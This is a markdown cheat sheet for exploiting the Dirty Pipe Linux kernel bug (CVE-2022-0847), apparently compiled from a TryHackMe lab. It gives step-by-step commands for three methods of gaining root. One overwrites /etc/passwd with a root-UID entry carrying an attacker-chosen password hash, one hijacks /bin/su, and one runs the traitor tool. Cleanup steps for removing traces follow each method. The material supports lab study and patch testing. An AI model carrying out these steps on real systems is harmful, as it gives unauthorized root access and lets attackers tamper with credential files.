# Dirty Pipe - CVE-2022-0847

## Version


Path in: 

|kernel versions|
|-|
|>5.10.102|
|>5.15.25|
|>5.16.11|


## Exploit 1

### Generating a SHA512Crypt Hash

```sh
openssl passwd -6 --salt SALT "PASSWORD"
```

### Get offset

```sh
grep -b "TARGET_ACCOUNT" /etc/passwd
```

### Run Exploit

```sh
gcc exploit.c -o exploit

cp /etc/passwd /tmp/passwd
./exploit /etc/passwd OFFSET DATA
```

or 

```sh
gcc exploit.c -o exploit

cp /etc/passwd /tmp/passwd
./exploit /etc/passwd 1 ':HASH:0:0:root:/root:/bin/bash
'
```



> Note

DATA: 

```sh
./exploit /etc/passwd 189 'USERNAME:HASH:0:0::/root:/bin/bash
'
```
### Clean up

```
mv /tmp/passwd /etc/passwd
```

## Exploit 2

```sh
gcc dirtypipez.c -o exploit
./exploit /bin/su
```
### Clean up
```sh
rm /tmp/sh
```

## Exploit 3

```sh
cp /etc/passwd /tmp/passwd
./traitor --exploit kernel:CVE-2022-0847
```

### Clean up
```sh
mv /tmp/passwd /etc/passwd
```


# Source

https://tryhackme.com/room/dirtypipe
https://dirtypipe.cm4all.com